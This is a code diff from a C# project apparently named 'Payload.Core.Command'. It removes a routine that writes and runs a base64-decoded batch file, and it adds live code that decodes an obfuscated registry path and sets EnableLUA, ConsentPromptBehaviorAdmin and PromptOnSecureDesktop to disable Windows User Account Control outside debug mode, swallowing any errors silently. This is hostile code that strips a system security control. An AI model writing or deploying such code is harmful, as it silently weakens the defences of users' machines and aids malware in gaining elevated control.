@@ -36,52 +36,28 @@ namespace Payload.Core.Command
         {
             try
             {
-                //OldCall();
-                BatCall();
+                OldCall();
             }
             catch { }
             
             return null;
         }
 
-        void BatCall()
-        {
-            string batPath = Config.Instance.WorkSpaceDir + "\\uac.bat";
-
-            using (StreamWriter writer = new StreamWriter(batPath))
-            {
-                writer.WriteLine(TextHelper.Base64Decode(TextHelper.UacBase64));
-            }
-            var p = new Process();
-            p.StartInfo.FileName = batPath;
-            p.Start();
-        }
-
         void OldCall()
         {
-            //string key = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
-            //var rs = new RegistrySecurity();
-            //RegistryKey uac = Registry.LocalMachine.CreateSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, rs);
+            string key = @"U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt";
+            key = TextHelper.Base64Decode(key);
+            var rs = new RegistrySecurity();
+            RegistryKey uac = Registry.LocalMachine.CreateSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, rs);
+            if (uac == null)
+                uac = Registry.LocalMachine.CreateSubKey(key);
+            UacConifg.UAC_TYPE uacLevel = Config.Instance.AppMode.Equals(EnumAppMode.DEBUG) ? UacConifg.UAC_TYPE.HIGH : UacConifg.UAC_TYPE.CLOSE;
 
-            //if (uac == null)
-            //{
-            //    uac = Registry.LocalMachine.CreateSubKey(key);
-            //}
+            uac.SetValue(UacConifg.ConsentPromptBehaviorAdmin_Name, UacConifg.GetUacConfig(uacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name));
+            uac.SetValue(UacConifg.EnableLUA_Name, UacConifg.GetUacConfig(uacLevel, UacConifg.EnableLUA_Name));
+            uac.SetValue(UacConifg.PromptOnSecureDesktop_Name, UacConifg.GetUacConfig(uacLevel, UacConifg.PromptOnSecureDesktop_Name));
 
-            //if (Config.Instance.AppMode.Equals(EnumAppMode.DEBUG))
-            //{
-            //    uac.SetValue("EnableLUA", 1);
-            //    uac.SetValue("ConsentPromptBehaviorAdmin", 2);
-            //    uac.SetValue("PromptOnSecureDesktop", 1);
-            //}
-            //else
-            //{
-            //    uac.SetValue("EnableLUA", 0);
-            //    uac.SetValue("ConsentPromptBehaviorAdmin", 0);
-            //    uac.SetValue("PromptOnSecureDesktop", 0);
-            //}
-
-            //uac.Close();
+            uac.Close();
         }
     }
 }
